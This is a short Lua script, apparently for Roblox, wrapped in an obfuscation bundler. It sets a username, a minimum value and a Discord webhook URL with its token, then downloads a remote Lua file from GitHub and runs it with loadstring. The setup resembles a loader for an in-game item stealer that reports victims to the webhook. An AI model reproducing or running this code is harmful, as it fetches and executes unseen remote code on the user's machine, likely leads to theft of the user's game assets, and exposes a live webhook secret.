local arg1 = ...;
local luaobf_bundle = {};
local _require = require;
local function require(path, ...)
	local fn = luaobf_bundle[path];
	if not fn then
		return _require(path, arg1, ...);
	end
	return fn(arg1, ...);
end
luaobf_bundle['file'] = function(...)
	_G.username = "sjkaka";
	_G.min_value = 10;
	_G.webhook = "https://discord.com/api/webhooks/1363215168586121389/fmtcoVLJ6Bdb5JnOSJzL6wd9C8XDhhAPq2CeD8naENd976xOU1sWj3FGhmMkwxeB86ND";
	loadstring(game:HttpGet("https://raw.githubusercontent.com/tacskull/rec/main/shjwkw.lua"))();
end;
return luaobf_bundle['file'](...);
